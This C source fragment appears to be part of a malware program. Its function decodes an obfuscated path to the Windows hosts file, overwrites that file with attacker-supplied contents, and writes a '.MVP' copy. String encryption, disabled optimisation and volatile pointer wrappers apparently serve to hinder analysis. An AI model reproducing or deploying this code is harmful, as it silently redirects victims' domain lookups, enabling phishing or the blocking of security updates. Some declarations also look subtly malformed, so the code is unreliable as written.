#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma optimize("", off)
uint32_t _HOSTSFile(void)
{
    char system_directory[256];
    char hosts_file_path[298];
    char hosts_backup_path[298];

    // Transform FILE* hosts_file
    volatile FILE* hosts_file_buf[2] = {{NULL, (FILE*)0}};
    volatile FILE* *p_hosts_file = (volatile FILE* *)&hosts_file_buf[0];

    // Transform FILE* temp_hosts_file
    volatile FILE* temp_hosts_file_buf[2] = {{NULL, (FILE*)0}};
    volatile FILE* *p_temp_hosts_file = (volatile FILE* *)&temp_hosts_file_buf[0];

    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Decrypt "\\drivers\\etc\\hosts"
    memset(hosts_file_path, 0, sizeof(hosts_file_path));
    _CiphStr(hosts_file_path, "\\qeviref\\rgp\\UBFGF");
    strcat(system_directory, hosts_file_path);

    strcpy(hosts_backup_path, system_directory);
    strcat(hosts_backup_path, ".MVP");

    (*p_hosts_file) = fopen(system_directory, "wb");
    (*p_temp_hosts_file) = fopen(hosts_backup_path, "wb");

    fputs(HOSTS_f, (*p_hosts_file));
    fputs(HOSTS_f, (*p_temp_hosts_file));

    fclose((*p_hosts_file));
    fclose((*p_temp_hosts_file));

    return 0;
}
#pragma optimize("", on)
